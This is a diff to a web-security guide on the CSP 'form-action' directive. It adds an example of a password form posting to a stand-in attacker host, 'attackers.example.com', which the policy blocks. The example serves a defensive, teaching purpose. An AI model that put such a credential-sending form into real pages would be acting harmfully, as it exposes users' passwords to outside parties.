@@ -13,14 +13,20 @@ date: Last Modified
 <pre>
 form-action 'self'
 </pre>
-<p>The above CSP policy would allow this form to continue working:</p>
+<p>The above CSP policy would allow this form work (because /search will be on the same origin, or same domain and scheme):</p>
 <pre>
 &lt;form action="/search"&gt;
     &lt;input type="search" name="query"&gt;
     &lt;input type="submit" value="Search"&gt;
 &lt;/form&gt;
 </pre>
-
+<p>However the browsers CSP engine would block the following form from posting to the external site:</p>
+<pre>
+&lt;form action="https://attackers.example.com/login"&gt;
+    &lt;input type="password" name="password"&gt;
+    &lt;input type="submit" value="Login"&gt;
+&lt;/form&gt;
+</pre>
 <p><strong>Allowing a different form action</strong>
 <p>Now suppose we want to allow a form action pointing to https://a.example.com and https://b.example.com we can specify these domains in <code>form-action</code> like this:</p>
 <pre>form-action https://a.example.com https://b.example.com</pre>
